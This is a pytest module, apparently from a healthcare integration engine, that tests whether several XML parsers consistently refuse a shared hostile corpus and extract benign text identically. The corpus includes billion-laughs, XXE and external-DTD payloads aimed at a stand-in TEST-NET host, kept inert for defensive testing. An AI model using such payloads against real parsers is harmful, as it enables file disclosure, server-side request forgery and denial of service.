# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (C) 2026 MessageFoundry Organization and contributors
"""ASVS 1.5.3 — every XML parse surface, held to ONE hostile corpus.

XML is the one data type this codebase parses with several libraries: **defusedxml** (inbound
``RawMessage.xml()``, and — since ADR 0086 §2(a′) — the Corepoint ``<Package>`` import, a second,
independently-configured call site), **xml.sax** (the SOAP ``<Body>`` well-formedness gate), **lxml**
(everything under ``parsing/xml/``, hardened once in ``harden.py``) and **xmlschema** — which sees only trees
already parsed through hardened lxml: the document always did, and since this module the **schema
source** does too, because xmlschema otherwise loaded an XSD with its own non-defused ElementTree and
expanded a DOCTYPE its sibling refuses outright. 1.5.1 is Pass because each is hardened at its own
construction site — but until this module nothing *bound* them: consistency rested on review, and a
divergence would be a parser-confusion hole (one surface accepting what a sibling refuses, or the two
accepting and reading different text).

The invariant asserted here is **one-directional**, and deliberately so::

    no parser ACCEPTS a document another parser REJECTS as hostile.

That is the security-relevant direction. The symmetric "all agree exactly" assertion is *false at
HEAD and should be*: the SOAP gate over-rejects two benign shapes, because it screens for the literal
substring ``<!doctype`` (so a DOCTYPE mentioned inside a comment or CDATA trips it) and because it
wraps the fragment in a throwaway ``<_mf_frag>`` shell (so any XML declaration becomes illegal
mid-document). Those over-rejections are asserted *explicitly* below rather than papered over — a
fail-closed gate refusing more than it must is safe; the reverse is not.

The declared-encoding vector is in :data:`BENIGN`, not in the over-rejection ledger, because the
divergence it used to cause was **fixed** rather than documented. A document declaring a non-UTF-8
encoding was ACCEPTED by both document-level parsers with **different text** — ``rm.xml()`` returned
``José`` where ``XmlMessage.parse(rm.raw)`` returned ``JosÃ©``, two public Handler APIs disagreeing
about a PHI value over the same ``RawMessage.raw``. Accept/accept-with-different-values is strictly
worse than the accept/reject case, and a corpus carrying only a *matching* declaration never sees it.
``harden.parse_bytes`` now drops the declaration's ``encoding=`` for ``str`` input (the connection
already decoded exactly once at ingress, ASVS 1.1.1), so both surfaces read the str's own characters;
:data:`BENIGN`'s ``declared-non-utf8`` entry is what holds them to it.

The SOAP surface has **no extraction API** (it installs a no-op ``ContentHandler`` and keeps no tree),
so the benign extraction-agreement leg drives xml.sax through a *test-side* ``ContentHandler`` — the
same hardened parser configuration **and the same ``<_mf_frag>`` wrapper**, with text collection added
— and compares it to the two document-level parsers over the documents that gate accepts
(:data:`SOAP_SAFE_BENIGN`).

The lxml/xmlschema third needs the ``[xml]`` extra. Where it is absent (this worktree, and every CI
leg but the main one) those tests SKIP — so a green local run is **not** evidence for that surface;
``.github/workflows/ci.yml``'s ``uv pip install --system -e ".[dev,harness,fhir,dicom,x12,xml,...]"``
leg is.
"""

from __future__ import annotations

import io
import xml.sax
from xml.sax.handler import ContentHandler, feature_external_ges, feature_external_pes
from xml.sax.xmlreader import InputSource

import pytest

from messagefoundry.parsing import RawMessage
from messagefoundry.transports.soap import _assert_well_formed_fragment

# --- the shared hostile corpus ----------------------------------------------
#
# Synthetic only; the external-entity vectors name RFC 5737 TEST-NET / a nonexistent local path so
# nothing here can reach a real resource even if a parser were misconfigured.

_INTERNAL_DTD = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "b">]><r>&a;</r>'
_BILLION_LAUGHS = (
    "<!DOCTYPE lolz ["
    '<!ENTITY lol "lol">'
    '<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
    '<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">'
    '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'
    "]><lolz>&lol3;</lolz>"
)
_EXTERNAL_ENTITY_FILE = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///nonexistent/mefor-xxe-probe">]>'
    "<r>&xxe;</r>"
)
_EXTERNAL_DTD_HTTP = (
    '<?xml version="1.0"?><!DOCTYPE r SYSTEM "http://203.0.113.10/evil.dtd"><r>x</r>'
)
_EXTERNAL_PARAMETER_ENTITY = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE r [<!ENTITY % pe SYSTEM "http://203.0.113.10/evil.dtd"> %pe;]>'
    "<r>x</r>"
)
_DUPLICATE_ATTRIBUTES = '<r a="1" a="2"><c>v</c></r>'
_ENCODING_MISMATCH_BOM = '﻿<?xml version="1.0" encoding="utf-16"?><r>x</r>'
_UNDEFINED_ENTITY = "<r>&nope;</r>"
_UNBALANCED = "<r><c>v</r></c>"

#: Every one of these MUST be refused by every parser that is offered it. Each names a distinct
#: mechanism, not five spellings of one.
HOSTILE = {
    "internal-dtd": _INTERNAL_DTD,
    "billion-laughs": _BILLION_LAUGHS,
    "external-entity-file": _EXTERNAL_ENTITY_FILE,
    "external-dtd-http": _EXTERNAL_DTD_HTTP,
    "external-parameter-entity": _EXTERNAL_PARAMETER_ENTITY,
    "duplicate-attributes": _DUPLICATE_ATTRIBUTES,
    "undefined-entity": _UNDEFINED_ENTITY,
    "unbalanced-tags": _UNBALANCED,
}

#: Benign documents every *document-level* parser must accept and read **the same way**. The
#: declaration-bearing entries are the ones that matter: a corpus of declaration-less documents (or of
#: documents whose declaration merely *agrees* with the body) cannot see an encoding divergence at all,
#: which is how an accept/accept disagreement over a PHI value survived the first version of this file.
#:
#: * ``declared-utf8`` — the declaration matches, so it is structurally incapable of diverging.
#: * ``declared-non-utf8`` — the declaration CONTRADICTS the str's characters. defusedxml ignores it
#:   for ``str`` input; lxml honoured it and re-read the UTF-8 bytes as ISO-8859-1, returning
#:   ``cafÃ©`` where its sibling returned ``café``. ``harden.parse_bytes`` now drops the stale claim,
#:   and this entry is what keeps the two surfaces reading one text.
#: * ``non-ascii`` — the same characters with NO declaration: the control proving the fix did not just
#:   mangle non-ASCII text everywhere.
BENIGN = {
    "plain": ("<r><c>hello</c></r>", "hello"),
    "declared-utf8": ('<?xml version="1.0" encoding="utf-8"?><r><c>hello</c></r>', "hello"),
    "declared-non-utf8": ('<?xml version="1.0" encoding="iso-8859-1"?><r><c>café</c></r>', "café"),
    "non-ascii": ("<r><c>café ünïcode</c></r>", "café ünïcode"),
    "entity-escaped-doctype-text": ("<r><c>&lt;!DOCTYPE evil&gt;</c></r>", "<!DOCTYPE evil>"),
    "cdata": ("<r><c><![CDATA[a < b & c]]></c></r>", "a < b & c"),
}

#: The subset of :data:`BENIGN` the SOAP gate also accepts — i.e. the documents whose extraction can
#: honestly be compared against that surface. Driving the whole of ``BENIGN`` through the SAX handler
#: asserted extraction agreement over a document the gate it stands in for *refuses*.
#:
#: Selected by the STRUCTURE that causes the over-rejection (the ``<_mf_frag>`` wrapper makes any XML
#: declaration illegal mid-document, recorded as ``SOAP_OVER_REJECTS["xml-declaration"]``) rather than
#: by a hardcoded name, so adding a declaration-bearing benign document cannot silently assert
#: agreement against a surface that refuses it. ``test_sax_reads_benign_text_the_same_way`` asserts the
#: gate really does accept each one, so an over-broad filter here cannot hide a surface.
SOAP_SAFE_BENIGN = {
    name: pair for name, pair in BENIGN.items() if not pair[0].lstrip("﻿").startswith("<?xml")
}

#: Benign shapes the SOAP gate refuses even though the document-level parsers accept them. Recorded
#: as an asserted, deliberate over-rejection — a fail-closed gate may refuse more than it must, and
#: pinning it here means a future loosening is a visible diff rather than a silent one.
SOAP_OVER_REJECTS = {
    # The `<!doctype` screen is a substring test, so a DOCTYPE named inside a comment or CDATA trips
    # it even though no DOCTYPE is declared.
    "doctype-in-comment": "<!-- <!DOCTYPE evil> --><r>ok</r>",
    "doctype-in-cdata": "<r><![CDATA[<!DOCTYPE evil>]]></r>",
    # The fragment is parsed wrapped in a throwaway <_mf_frag> shell, so ANY XML declaration is
    # illegal mid-document — including a correct one. Same construct as BENIGN["declared-utf8"],
    # which is therefore held out of SOAP_SAFE_BENIGN above.
    "xml-declaration": '<?xml version="1.0" encoding="utf-8"?><r>x</r>',
}


# --- surface adapters --------------------------------------------------------
#
# Each returns None on accept and raises on reject, so one corpus drives all of them.


def _defusedxml_parse(document: str) -> object:
    """Surface 1 — inbound ``RawMessage.xml()``: defusedxml with forbid_dtd/entities/external."""
    return RawMessage(document, "xml").xml()


def _soap_gate(document: str) -> None:
    """Surface 2 — the SOAP ``<Body>`` well-formedness gate (hardened ``xml.sax``, no extraction)."""
    _assert_well_formed_fragment(document)


def _corepoint_parse(document: str) -> object:
    """Surface 4 — the Corepoint ``<Package>`` import (ADR 0086 §2(a′)): defusedxml, all flags ON.

    Driven at ``_hardened_fromstring`` rather than at ``parse_package``, deliberately. The public
    entry point *also* refuses any document carrying no ``<ActionList>`` — which is every document in
    this corpus — so aiming this adapter at ``parse_package`` would make the hostile leg pass for a
    structural reason that has nothing to do with XML hardening: a check that cannot fail. Calling the
    parse surface itself means a loosened flag reds the build.
    """
    from messagefoundry.corepoint_import import _hardened_fromstring

    return _hardened_fromstring(document)


def _lxml_parse(document: str | bytes) -> object:
    """Surface 3 — ``parsing/xml/harden.py``: the hardened lxml parser + post-parse DOCTYPE refusal.

    Takes ``bytes`` too: the str and bytes paths treat the encoding declaration DIFFERENTLY on
    purpose (see ``harden._without_declared_encoding``), so both have to be reachable from here.
    """
    from messagefoundry.parsing.xml.harden import parse_bytes

    return parse_bytes(document)


class _TextCollector(ContentHandler):
    """A test-side extraction handler for the SAX surface, which ships none.

    Mirrors ``soap._assert_well_formed_fragment``'s parser configuration exactly (external general
    and parameter entities OFF) and only adds character collection.
    """

    def __init__(self) -> None:
        super().__init__()
        self.text: list[str] = []

    def characters(self, content: str) -> None:
        self.text.append(content)


def _sax_extract(document: str) -> str:
    """Character data the hardened SAX configuration reads from ``document``.

    Gate-faithful: the document is wrapped in the **same** throwaway ``<_mf_frag>`` shell
    ``soap._assert_well_formed_fragment`` uses, not parsed bare. Without the wrapper this read
    documents that surface actually refuses (any XML declaration is illegal mid-document once
    wrapped), so "what it reads is what that gate structurally accepted" would have been false.
    """
    parser = xml.sax.make_parser()  # noqa: S317  # nosec B317 — external entities OFF below
    parser.setFeature(feature_external_ges, False)
    parser.setFeature(feature_external_pes, False)
    handler = _TextCollector()
    parser.setContentHandler(handler)
    source = InputSource()
    source.setByteStream(io.BytesIO(f"<_mf_frag>{document}</_mf_frag>".encode()))
    parser.parse(source)
    return "".join(handler.text)


def _accepts(surface, document: str) -> bool:  # type: ignore[no-untyped-def]
    """Whether ``surface`` accepts ``document`` (any exception counts as a refusal)."""
    try:
        surface(document)
    except Exception:  # noqa: BLE001 — the corpus is judged on accept/reject, not on error type
        return False
    return True


def _lxml_available() -> bool:
    try:
        import lxml.etree  # noqa: F401
        import xmlschema  # noqa: F401
    except ImportError:
        return False
    return True


# --- the gate ----------------------------------------------------------------


@pytest.mark.parametrize("name", sorted(HOSTILE))
def test_defusedxml_refuses_every_hostile_document(name: str) -> None:
    assert not _accepts(_defusedxml_parse, HOSTILE[name])


@pytest.mark.parametrize("name", sorted(HOSTILE))
def test_soap_gate_refuses_every_hostile_document(name: str) -> None:
    # The SOAP gate had no hostile-corpus test of its own before this module; it is the surface that
    # sees attacker-influenceable HL7-derived content on the way OUT.
    assert not _accepts(_soap_gate, HOSTILE[name])


@pytest.mark.parametrize("name", sorted(HOSTILE))
def test_lxml_refuses_every_hostile_document(name: str) -> None:
    pytest.importorskip("lxml")
    assert not _accepts(_lxml_parse, HOSTILE[name])


@pytest.mark.parametrize("name", sorted(HOSTILE))
def test_corepoint_import_refuses_every_hostile_document(name: str) -> None:
    # The Corepoint import is an OPERATOR-facing surface (an export handed to the CLI), not an
    # inbound one — but it is still untrusted data, and a fourth XML parser that accepted what its
    # three siblings refuse is exactly the parser-confusion split this module exists to forbid.
    assert not _accepts(_corepoint_parse, HOSTILE[name])


@pytest.mark.parametrize("name", sorted(HOSTILE))
def test_no_parser_accepts_what_a_sibling_refuses(name: str) -> None:
    # THE consistency assertion — the reason the cell exists. Stated as a per-document unanimity check
    # so the failure message names which surface disagreed.
    document = HOSTILE[name]
    verdicts = {
        "defusedxml": _accepts(_defusedxml_parse, document),
        "xml.sax (soap gate)": _accepts(_soap_gate, document),
        "defusedxml (corepoint import)": _accepts(_corepoint_parse, document),
    }
    if _lxml_available():
        verdicts["lxml (harden.py)"] = _accepts(_lxml_parse, document)
    assert not any(verdicts.values()), f"parser disagreement on {name}: {verdicts}"


@pytest.mark.parametrize("name", sorted(BENIGN))
def test_corepoint_import_reads_benign_text_like_its_siblings(name: str) -> None:
    # The other direction: agreeing to reject is worthless if an accepted document is read
    # differently. The Corepoint surface is a document-level parser like `RawMessage.xml()`, so it is
    # held to the same extraction — including the declared-encoding vector that once split two
    # surfaces over the same characters.
    document, expected = BENIGN[name]
    assert "".join(_corepoint_parse(document).itertext()) == expected  # type: ignore[attr-defined]


@pytest.mark.parametrize("name", sorted(BENIGN))
def test_document_level_parsers_extract_benign_text_identically(name: str) -> None:
    # The other half of consistency: agreeing to reject is worthless if the accepted documents are
    # read differently. Scoped to the two (three with the extra) surfaces that expose text; the SAX
    # surface is driven through the test-side handler below.
    document, expected = BENIGN[name]
    assert "".join(_defusedxml_parse(document).itertext()) == expected  # type: ignore[attr-defined]
    if _lxml_available():
        assert "".join(_lxml_parse(document).itertext()) == expected  # type: ignore[attr-defined]


@pytest.mark.parametrize("name", sorted(SOAP_SAFE_BENIGN))
def test_sax_reads_benign_text_the_same_way(name: str) -> None:
    # Scoped to the documents the SOAP gate ACCEPTS: asserting extraction agreement over one it
    # refuses would compare a reading that surface never performs.
    document, expected = SOAP_SAFE_BENIGN[name]
    assert _accepts(_soap_gate, document), f"{name} is not accepted by the surface being mirrored"
    assert _sax_extract(document) == expected


@pytest.mark.parametrize("name", sorted(BENIGN))
def test_document_level_parsers_accept_every_benign_document(name: str) -> None:
    document, _expected = BENIGN[name]
    assert _accepts(_defusedxml_parse, document)
    if _lxml_available():
        assert _accepts(_lxml_parse, document)


def test_a_declared_encoding_cannot_make_two_parsers_read_different_text() -> None:
    """The declared-encoding vector — the accept/accept divergence, and the fix that closed it.

    ``RawMessage.raw`` is already ``str``: the connection decoded the body **exactly once** at ingress
    with its own declared encoding (ASVS 1.1.1), so the document's ``encoding=`` claim is stale
    metadata about bytes nobody will look at again. ``ElementTree`` ignores it for ``str`` input.
    ``harden.parse_bytes`` used to encode the str to UTF-8 and leave the claim in place, which told
    libxml2 to decode those UTF-8 bytes as the *declared* charset — a **second** decode, and the exact
    thing the ingress invariant exists to prevent.

    The result was not an accept/reject disagreement (the safe direction) but an **accept/accept**
    one: two public Handler APIs returning different PHI from the same ``rm.raw``. That is the
    SSRF-analogue this module's JSON/URL clause names, and it is the one shape a corpus of
    declaration-less documents cannot see.

    Asserted through the PUBLIC surfaces, not the internals — this is a statement about what a Handler
    author gets back.
    """
    body = '<?xml version="1.0" encoding="iso-8859-1"?><Patient><name>José</name></Patient>'
    raw = RawMessage(raw=body, content_type="xml")
    defused = raw.xml().find("name")
    assert defused is not None and defused.text == "José"
    if _lxml_available():
        from messagefoundry.parsing.xml.message import XmlMessage

        assert XmlMessage.parse(raw.raw).get("//name/text()") == "José"

    # A BOM-prefixed declaration is the same mechanism, and must not resurrect the second decode.
    assert "".join(_defusedxml_parse(_ENCODING_MISMATCH_BOM).itertext()) == "x"  # type: ignore[attr-defined]
    assert "".join(_defusedxml_parse('<?xml version="1.0"?><r>x</r>').itertext()) == "x"  # type: ignore[attr-defined]
    if _lxml_available():
        assert "".join(_lxml_parse(_ENCODING_MISMATCH_BOM).itertext()) == "x"  # type: ignore[attr-defined]
    # The SOAP gate still refuses any declaration — its wrapper makes one illegal mid-document. That
    # over-rejection is the fail-closed direction and stays recorded, not asserted away.
    assert not _accepts(_soap_gate, _ENCODING_MISMATCH_BOM)


def test_bytes_input_keeps_honouring_its_own_encoding_declaration() -> None:
    """Anti-over-correction: the declaration is dropped for ``str`` ONLY.

    For ``bytes`` the declaration is the sender's genuine, first-and-only statement about its own
    bytes — dropping it there would corrupt every legitimately non-UTF-8 document. A blanket strip
    would pass every other test in this file, so this is the one that would catch it.
    """
    if not _lxml_available():
        pytest.skip("lxml (the [xml] extra) is not installed")
    latin1 = '<?xml version="1.0" encoding="iso-8859-1"?><r><c>café</c></r>'.encode("iso-8859-1")
    assert "".join(_lxml_parse(latin1).itertext()) == "café"  # type: ignore[arg-type,attr-defined]


@pytest.mark.parametrize("name", sorted(SOAP_OVER_REJECTS))
def test_soap_gate_over_rejections_are_recorded_not_accidental(name: str) -> None:
    # Asserted in BOTH directions so the divergence is documented rather than merely tolerated: the
    # document-level parsers accept it, the SOAP gate refuses it, and that is the intended (safe)
    # direction of disagreement.
    document = SOAP_OVER_REJECTS[name]
    assert _accepts(_defusedxml_parse, document), f"{name} should be benign to defusedxml"
    assert not _accepts(_soap_gate, document), f"{name} is no longer refused by the SOAP gate"


#: An XSD that carries a DOCTYPE with an internal entity, and USES the entity for the element name —
#: so the schema only loads at all if the entity was expanded. It is the xmlschema surface's adapter
#: into the hostile corpus: ``harden.parse_bytes`` refuses a DOCTYPE outright, so the fourth parser
#: accepting this would be exactly the accept/reject split between siblings this module forbids.
_DOCTYPE_SCHEMA = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE xs:schema [<!ENTITY nm "patient">]>'
    '<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">'
    '<xs:element name="&nm;" type="xs:string"/>'
    "</xs:schema>"
)
_CLEAN_SCHEMA = (
    '<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">'
    '<xs:element name="patient" type="xs:string"/>'
    "</xs:schema>"
)


def test_xmlschema_refuses_a_schema_its_siblings_would_refuse() -> None:
    # EXECUTABLE, not a source-text grep. The previous version of this test asserted only that the
    # strings allow="local"/base_url=None/parse_bytes( appear in schema.py — which stayed true no
    # matter what call shape was added, and was true while xmlschema parsed the SCHEMA source with its
    # own non-defused ElementTree: _DOCTYPE_SCHEMA loaded with valid=True, its internal entity
    # EXPANDED, against a sibling that refuses a DOCTYPE outright.
    if not _lxml_available():
        pytest.skip("xmlschema/lxml (the [xml] extra) are not installed")
    from messagefoundry.parsing.xml.errors import XmlValidationError
    from messagefoundry.parsing.xml.schema import validate_against

    with pytest.raises(XmlValidationError):
        validate_against("<patient>x</patient>", _DOCTYPE_SCHEMA)
    # Anti-vacuity: the same assertion over an equivalent DOCTYPE-free schema must still WORK, so the
    # refusal is the DOCTYPE and not a broken schema path.
    assert validate_against("<patient>x</patient>", _CLEAN_SCHEMA).valid
    assert not validate_against("<other>x</other>", _CLEAN_SCHEMA).valid


def test_xmlschema_still_disables_remote_schema_resolution() -> None:
    # The SSRF half of the fourth parser's lockdown, kept as a source pin because allow="local" has no
    # observable effect without a network. Narrow and honest about being a pin.
    source = (__import__("pathlib").Path(__file__).resolve().parent.parent).joinpath(
        "messagefoundry", "parsing", "xml", "schema.py"
    )
    text = source.read_text(encoding="utf-8")
    assert 'allow="local"' in text and "base_url=None" in text
